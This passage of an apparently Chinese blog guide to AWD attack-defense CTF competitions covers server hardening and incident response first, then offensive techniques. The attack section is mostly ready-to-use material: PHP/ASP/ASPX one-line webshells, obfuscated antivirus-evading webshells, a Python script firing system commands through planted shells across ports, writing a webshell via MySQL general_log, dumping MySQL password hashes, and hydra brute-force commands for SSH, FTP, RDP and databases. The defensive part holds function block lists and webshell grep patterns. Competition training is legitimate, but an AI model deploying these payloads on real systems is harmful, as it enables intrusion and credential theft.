PHP参数安全配置"></a>2.2.4 PHP参数安全配置</h4><p>首先找到PHP的配置文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">/etc/php/&#123;version&#125;/php.ini<br></code></pre></td></tr></table></figure><p>禁用高危函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link<br></code></pre></td></tr></table></figure><p>配置 <code>open_basedir</code> （将用户访问文件的活动范围限制在指定的区域）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">open_basedir=/<span class="hljs-keyword">var</span>/www/html<br></code></pre></td></tr></table></figure><p>禁用魔术引号（自动对外部来源数据进行转义，防止SQL注入）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">magic_quotes_gpc = Off<br></code></pre></td></tr></table></figure><p>关闭PHP伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen = Off<br>allow_url_include = Off<br></code></pre></td></tr></table></figure><p>重启PHP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo service php7<span class="hljs-number">.0</span>-fpm restart<br>sudo systemctl restart php7<span class="hljs-number">.0</span>-fpm.service<br></code></pre></td></tr></table></figure><h3 id="2-3-数据库安全加固"><a href="#2-3-数据库安全加固" class="headerlink" title="2.3# 数据库安全加固"></a>2.3# 数据库安全加固</h3><h4 id="2-3-1-Mysql加固"><a href="#2-3-1-Mysql加固" class="headerlink" title="2.3.1 Mysql加固"></a>2.3.1 Mysql加固</h4><p>为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456</p><ol><li>不使用默认口令，修改成复杂的，并确保和web环境连接</li><li>设置只允许本地127.0.0.1账户登录：修改 <code>bind-address=127.0.0.1</code> ；在配置文件中加入 <code>seccure_file_priv=NULL</code></li><li>开启日志审计功能：<code>general_log_file=</code>路径</li></ol><p>因为最常用的是Mysql数据库，所以基本的攻防大部分都是用MySql数据库的命令</p><p>备份指定数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysqldump –u username –p password databasename <span class="hljs-operator">&gt;</span> target.sql<br></code></pre></td></tr></table></figure><p>备份所有数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysqldump –<span class="hljs-keyword">all</span> <span class="hljs-operator">-</span>databases <span class="hljs-operator">&gt;</span> all.sql<br></code></pre></td></tr></table></figure><p>导入数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql –u username –p password database <span class="hljs-operator">&lt;</span> from.sql<br></code></pre></td></tr></table></figure><p>对于MySQL的攻防，可以看这篇文章：<a href="https://blog.zgsec.cn/archives/26.html">https://blog.zgsec.cn/archives/26.html</a></p><p>MySQL默认配置文件路径：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">C:</span>\\Program Files\MySQL\MySQLServer <span class="hljs-number">5.1</span>\my.ini   <span class="hljs-comment">//Windows</span><br><span class="hljs-keyword">/etc/</span>my.cnf                                      <span class="hljs-comment">//Linux</span><br><span class="hljs-keyword">/etc/</span>mysql/my.cnf                                <span class="hljs-comment">//Linux</span><br></code></pre></td></tr></table></figure><p>修改 <code>secure_file_priv</code> 参数（日志功能的对应目录）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">secure_file_priv<span class="hljs-operator">=</span>&quot;&quot;<br></code></pre></td></tr></table></figure><p>重载MySQL配置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">FLUSH PRIVILEGES<br></code></pre></td></tr></table></figure><p>重启MySQL服务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo service mysql restart<br>sudo systemctl restart mysql<br></code></pre></td></tr></table></figure><h4 id="2-3-2-Mssql加固"><a href="#2-3-2-Mssql加固" class="headerlink" title="2.3.2 Mssql加固"></a>2.3.2 Mssql加固</h4><ol><li>删除不必要的账号</li><li>SQLServer用户口令安全</li><li>根据用户分配帐号避免帐号共享</li><li>分配数据库用户所需的最小权限</li><li>网络访问限制</li><li>SQLServer登录审计</li><li>SQLServer安全事件审计</li><li>配置日志功能</li></ol><h3 id="2-4-远程控制加固"><a href="#2-4-远程控制加固" class="headerlink" title="2.4# 远程控制加固"></a>2.4# 远程控制加固</h3><h4 id="2-4-1-SSH安全加固"><a href="#2-4-1-SSH安全加固" class="headerlink" title="2.4.1 SSH安全加固"></a>2.4.1 SSH安全加固</h4><p>限制IP登录方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nano /etc/ssh/sshd_config       <span class="hljs-comment">//以root权限编辑SSH配置文件</span><br>AllowUsers username@<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.100</span>    <span class="hljs-comment">//找到并编辑以下行，确保其取消注释并设置为所需的IP地址</span><br></code></pre></td></tr></table></figure><p>禁用 <code>root</code> 远程登录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nano /etc/ssh/sshd_config       <span class="hljs-comment">//以root权限编辑SSH配置文件</span><br>PermitRootLogin no                   <span class="hljs-comment">//将PermitRootLogi设置为“no”</span><br></code></pre></td></tr></table></figure><p>按用户和组限制SSH登录</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo nano /etc/ssh/sshd_config       <span class="hljs-comment">//以root权限编辑SSH配置文件</span><br>AllowUsers testuser                  <span class="hljs-comment">//设置只允许 testuser 登录SSH</span><br>AllowUsers testuser@<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>    <span class="hljs-comment">//设置只允许 192.168.1.100 的机器用 testuser 账户登录SSH</span><br>AllowGroups test                     <span class="hljs-comment">//设置用户组白名单</span><br><span class="hljs-comment">//需要注意的是：如果同时指定了 AllowUsers 与 AllowGroups 那么必须要在两个选项中都匹配到的用户才能进行SSH登录</span><br></code></pre></td></tr></table></figure><p>重启SSH服务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo service sshd restart<br>sudo systemctl restart sshd.service<br></code></pre></td></tr></table></figure><h4 id="2-4-2-RDP远程登录安全加固"><a href="#2-4-2-RDP远程登录安全加固" class="headerlink" title="2.4.2 RDP远程登录安全加固"></a>2.4.2 RDP远程登录安全加固</h4><p>删除默认帐户并手动添加新用户：</p><ul><li>步骤1：按 <code>Win + R</code> 打开运行对话框，输入 <code>secpol.msc</code> 并单击 “确定”</li><li>步骤2：导航至此处：本地策略–&gt;用户权限分配，再双击打开 “允许通过远程桌面服务登录”</li><li>步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组）</li><li>步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户</li></ul><p>更改默认RDP端口号：</p><ul><li>步骤1：打开运行对话框，输入 <code>regedit</code> 并单击 “确定”</li><li>步骤2：打开 <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</code> ，向下滚动并找到 <code>PortNumber</code> 然后双击它</li><li>步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定”</li></ul><h3 id="2-5-应急响应"><a href="#2-5-应急响应" class="headerlink" title="2.5# 应急响应"></a>2.5# 应急响应</h3><h4 id="2-5-1-查询进程线程"><a href="#2-5-1-查询进程线程" class="headerlink" title="2.5.1 查询进程线程"></a>2.5.1 查询进程线程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">netstat<br>ps -aux<br>netstat -apt<br></code></pre></td></tr></table></figure><h4 id="2-5-2-杀掉进程"><a href="#2-5-2-杀掉进程" class="headerlink" title="2.5.2 杀掉进程"></a>2.5.2 杀掉进程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">kill <span class="hljs-number">-9</span> pid            <span class="hljs-comment">//Linux上</span><br>taskkill /f /pid pid   <span class="hljs-comment">//Windows上</span><br></code></pre></td></tr></table></figure><h4 id="2-5-3-搜索WebShell文件"><a href="#2-5-3-搜索WebShell文件" class="headerlink" title="2.5.3 搜索WebShell文件"></a>2.5.3 搜索WebShell文件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">find /var/www/html -name *.php -mmin <span class="hljs-number">-5</span>                        <span class="hljs-comment">//查看最近5分钟修改文件</span><br>find ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs wc -l | sort -u                  <span class="hljs-comment">//寻找行数最短文件，一般有可能是一句话木马</span><br>grep -r --include=*.php  <span class="hljs-string">&#x27;[^a-z]eval($_POST&#x27;</span>  /var/www/html    <span class="hljs-comment">//查包含关键字的php文件</span><br>find /var/www/html -type f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span> |more <span class="hljs-comment">//在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串&quot;eval(&quot;的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看</span><br></code></pre></td></tr></table></figure><h4 id="2-5-4-查杀不死马"><a href="#2-5-4-查杀不死马" class="headerlink" title="2.5.4 查杀不死马"></a>2.5.4 查杀不死马</h4><p>也可以利用命令自动进行查找删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ps -aux | grep www-data | grep -v grep | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs kill <span class="hljs-number">-9</span><br></code></pre></td></tr></table></figure><p>然后重启服务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">service php-fpm restart<br></code></pre></td></tr></table></figure><h4 id="2-5-5-杀弹反弹shell"><a href="#2-5-5-杀弹反弹shell" class="headerlink" title="2.5.5 杀弹反弹shell"></a>2.5.5 杀弹反弹shell</h4><p>老规矩查看进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ps -ef<br>px -aux<br>ps -aux | grep www-data<br></code></pre></td></tr></table></figure><p>注意 <code>www-data</code> 权限的 <code>/bin/sh</code>，很有可能是nc</p><p>再就是上老一套命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kill ps -aux | grep www-data | grep apache2 | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="3-自由攻击环节（Attack）"><a href="#3-自由攻击环节（Attack）" class="headerlink" title="3# 自由攻击环节（Attack）"></a>3# 自由攻击环节（Attack）</h2><h3 id="3-0-主要准备内容"><a href="#3-0-主要准备内容" class="headerlink" title="3.0# 主要准备内容"></a>3.0# 主要准备内容</h3><ol><li>各类CMS软件包最新版准备</li><li>扫描工具：Nmap、Nessus、Metasploit更新</li><li>漏洞利用脚本Poc、Exp</li></ol><h3 id="3-1-基本信息搜集"><a href="#3-1-基本信息搜集" class="headerlink" title="3.1# 基本信息搜集"></a>3.1# 基本信息搜集</h3><h4 id="3-1-1-主机信息搜集"><a href="#3-1-1-主机信息搜集" class="headerlink" title="3.1.1 主机信息搜集"></a>3.1.1 主机信息搜集</h4><p>Nmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -sn <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>            <span class="hljs-comment">//C段存活扫描</span><br></code></pre></td></tr></table></figure><p>httpscan</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">httpscan.py <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> –t <span class="hljs-number">10</span>   <span class="hljs-comment">//C段存活扫描</span><br></code></pre></td></tr></table></figure><h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">nmap -sV <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>               <span class="hljs-comment">//扫描主机系统版本</span><br>nmap -sS <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>               <span class="hljs-comment">//扫描主机常用端口</span><br>nmap -sS -p <span class="hljs-number">80</span>,<span class="hljs-number">445</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>     <span class="hljs-comment">//扫描主机部分端口</span><br>nmap -sS -p- <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>           <span class="hljs-comment">//扫描主机全部端口</span><br></code></pre></td></tr></table></figure><p>Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">255</span>): <br>    url = <span class="hljs-string">&quot;http://192.168.1.&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(x) <br>    <span class="hljs-keyword">try</span>: <br>        r = requests.post(url) <br>        <span class="hljs-built_in">print</span>(url) <br>        <span class="hljs-keyword">except</span>: <br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h3 id="3-2-外部打点"><a href="#3-2-外部打点" class="headerlink" title="3.2# 外部打点"></a>3.2# 外部打点</h3><h4 id="3-2-0-常见系统漏洞"><a href="#3-2-0-常见系统漏洞" class="headerlink" title="3.2.0 常见系统漏洞"></a>3.2.0 常见系统漏洞</h4><ul><li>MS17-010（永恒之蓝，可看<a href="https://blog.zgsec.cn/archives/172.html">https://blog.zgsec.cn/archives/172.html</a>）</li><li>MySQL进行UDF提权（SQL注入或者MySQL弱口令）</li><li>MsSQL进行系统命令执行（SQL注入或者MsSQL弱口令）</li><li>SSH弱口令或默认口令</li><li>PWN（这个要看具体AWD比赛提供的内容了）</li></ul><h4 id="3-2-1-中间件漏洞"><a href="#3-2-1-中间件漏洞" class="headerlink" title="3.2.1 中间件漏洞"></a>3.2.1 中间件漏洞</h4><ul><li>IIS（解析漏洞、远程代码执行）</li><li>Apache（解析漏洞）</li><li>Nginx（解析漏洞）</li><li>Jboss（CVE-2017-7504&#x2F;CVE-2017-12149&#x2F;CVE-2015-7501）</li><li>Mysql（弱口令）</li><li>Tomcat（弱口令Getshell）</li><li>Weblogic（CVE-2020-2551&#x2F;CVE-2020-2555&#x2F;CVE-2020-2883）</li><li>SpringBoot（未授权访问漏洞和RCE漏洞，具体可看<a href="https://blog.zgsec.cn/archives/129.html">https://blog.zgsec.cn/archives/129.html</a>）</li></ul><h4 id="3-2-2-集成服务环境漏洞"><a href="#3-2-2-集成服务环境漏洞" class="headerlink" title="3.2.2 集成服务环境漏洞"></a>3.2.2 集成服务环境漏洞</h4><ul><li>wampserver</li><li>xamppserver</li></ul><h4 id="3-2-3-CMS漏洞利用"><a href="#3-2-3-CMS漏洞利用" class="headerlink" title="3.2.3 CMS漏洞利用"></a>3.2.3 CMS漏洞利用</h4><p>搜集最新版本的CMS，以及对应的漏洞Poc和Exp，这里仅仅列举部分CMS：</p><ul><li>Aspcms</li><li>Dedecms</li><li>Dicuz</li><li>Drupal</li><li>Empirecms</li><li>Eshop</li><li>Finecms</li><li>Joomla</li><li>Lamp</li><li>Metainfo</li><li>Phpcms</li><li>Phpwind</li><li>Qibocms</li><li>Seacms</li><li>Semcms</li><li>ThinkPHP</li><li>Wolfcms</li><li>Wordpress</li><li>Zabbix</li></ul><p>备份文件爆破：使用7kbScan等目录扫描工具对Web系统进行爆破</p><h4 id="3-2-4-上传WebShell"><a href="#3-2-4-上传WebShell" class="headerlink" title="3.2.4 上传WebShell"></a>3.2.4 上传WebShell</h4><p>常见一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP： <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span>      <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br>Asp：   &lt;%<span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span> (<span class="hljs-string">&quot;pass&quot;</span>)%&gt;<br>Aspx：  &lt;%@ Page Language=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">&quot;pass&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><p>Get型木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);           <span class="hljs-comment">//利用方式/shell.php?pass=eval($_POST[1]);</span><br></code></pre></td></tr></table></figure><p>免杀马制作：<a href="https://github.com/AabyssZG/WebShell-Bypass-Guide">https://github.com/AabyssZG/WebShell-Bypass-Guide</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>~<span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;$&lt;&gt;/&#x27;</span>^<span class="hljs-string">&#x27;&#123;&#123;&#123;&#123;&#x27;</span>;@$&#123;<span class="hljs-variable">$_</span>&#125;[_](@$&#123;<span class="hljs-variable">$_</span>&#125;[__]);                            <span class="hljs-comment">//执行GET传参 ?_=system&amp;__=whoami 来执行whoami命令</span><br><span class="hljs-meta">&lt;?=</span>~<span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;$&lt;&gt;/&#x27;</span>^<span class="hljs-string">&#x27;&#123;&#123;&#123;&#123;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&#x27;$+4(/&#x27;</span> ^ <span class="hljs-string">&#x27;&#123;&#123;&#123;&#123;&#123;&#x27;</span>;@$&#123;<span class="hljs-variable">$_</span>&#125;[_](@$&#123;<span class="hljs-variable">$___</span>&#125;[__]);   <span class="hljs-comment">//执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell</span><br></code></pre></td></tr></table></figure><p>隐藏的文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(php<span class="hljs-string">&#x27;flag:&#x27;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>));<br></code></pre></td></tr></table></figure><p>条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现</p><h4 id="3-2-5-利用WebShell"><a href="#3-2-5-利用WebShell" class="headerlink" title="3.2.5 利用WebShell"></a>3.2.5 利用WebShell</h4><p>curl(跟hackbar差不多)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\admin&gt;curl <span class="hljs-string">&quot;http://192.168.182.130:8801/include/shell.php&quot;</span> -d <span class="hljs-string">&quot;admin_ccmd=system(&#x27;cat /f*&#x27;);&quot;</span><br><span class="hljs-comment">//向shell.php文件里传入参数并返回结果</span><br></code></pre></td></tr></table></figure><p>Python多端口传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br>url_head=<span class="hljs-string">&quot;http://192.168.182.130&quot;</span>   <span class="hljs-comment">#网段</span><br>url=<span class="hljs-string">&quot;&quot;</span><br>shell_addr=<span class="hljs-string">&quot;/upload/url/shell.php&quot;</span> <span class="hljs-comment">#木马路径</span><br>passwd=<span class="hljs-string">&quot;pass&quot;</span>                   <span class="hljs-comment">#木马密码</span><br><span class="hljs-comment">#port=&quot;80&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;System(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;<br><span class="hljs-comment"># find / -name &quot;flag*&quot;</span><br><br><span class="hljs-comment">#清空上次记录</span><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>flag.close()<br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8000</span>,<span class="hljs-number">8004</span>):<br>    url=url_head+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(i)+shell_addr<br>    <span class="hljs-keyword">try</span>:<br>        res=requests.post(url,payload)<span class="hljs-comment">#,timeout=1</span><br>        <span class="hljs-keyword">if</span> res.status_code == requests.codes.ok:<br>            result = res.text<br>            <span class="hljs-built_in">print</span> (result)<br>            flag.write(result+<span class="hljs-string">&quot;\n&quot;</span>) <br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;shell 404&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span> (url+<span class="hljs-string">&quot; connect shell fail&quot;</span>)<br><br>flag.close()<br></code></pre></td></tr></table></figure><h4 id="3-2-6-MySQL数据库利用"><a href="#3-2-6-MySQL数据库利用" class="headerlink" title="3.2.6 MySQL数据库利用"></a>3.2.6 MySQL数据库利用</h4><p>具体可以看这篇文章：<a href="https://blog.zgsec.cn/archives/26.html">https://blog.zgsec.cn/archives/26.html</a></p><p>1、查看MySQL版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%version%&#x27;</span>;<br><span class="hljs-keyword">select</span> version();      #这个只显示MySQL版本号<br></code></pre></td></tr></table></figure><p>2、查看 <code>load_file()</code> 开启状态</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;       #这条可查看详细信息<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>3、查看日志功能是否开启和对应目录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> &quot;ON&quot;;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;/var/www/html/test.php&#x27;</span>;   #可以写入WebShell然后直接连接蚁剑<br><br># 往日志里面写入 WebShell<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&#x27;</span>AabyssTeam<span class="hljs-string">&#x27;]);?&gt;&#x27;</span>;<br># 此时已经写到 test.php 文件当中了，注意这个要知道网站的具体路径才可以实现<br></code></pre></td></tr></table></figure><p>小技巧：获取MySQL账户和对应密码Hash</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"># MySQL <span class="hljs-operator">&lt;=</span> <span class="hljs-number">5.6</span> 版本<br><span class="hljs-keyword">select</span> host, <span class="hljs-keyword">user</span>, password <span class="hljs-keyword">from</span> mysql.user;<br><br># MySQL <span class="hljs-operator">&gt;=</span> <span class="hljs-number">5.7</span> 版本<br><span class="hljs-keyword">select</span> host,<span class="hljs-keyword">user</span>,authentication_string <span class="hljs-keyword">from</span> mysql.user;<br></code></pre></td></tr></table></figure><h4 id="3-2-7-弱口令爆破"><a href="#3-2-7-弱口令爆破" class="headerlink" title="3.2.7 弱口令爆破"></a>3.2.7 弱口令爆破</h4><p>爆破SSH密码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh<br>hydra -L 用户名字典.txt -P 密码字典.txt ssh:<span class="hljs-comment">//192.168.1.100</span><br>hydra -L 用户名字典.txt -P 密码字典.txt ssh:<span class="hljs-comment">//192.168.1.100 -s 40      //40是⽬标服务开放的端⼝</span><br></code></pre></td></tr></table></figure><p>爆破FTP密码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp<br>hydra -L 用户名字典.txt -P 密码字典.txt ftp:<span class="hljs-comment">//192.168.1.100/</span><br></code></pre></td></tr></table></figure><p>爆破RDP远程桌面密码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V<br></code></pre></td></tr></table></figure><p>爆破Telnet</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V<br></code></pre></td></tr></table></figure><p>爆破MSSQL数据库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hydra -l sa -P 密码字典.txt 目标IP地址 mssql<br></code></pre></td></tr></table></figure><p>爆破MySQL数据库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 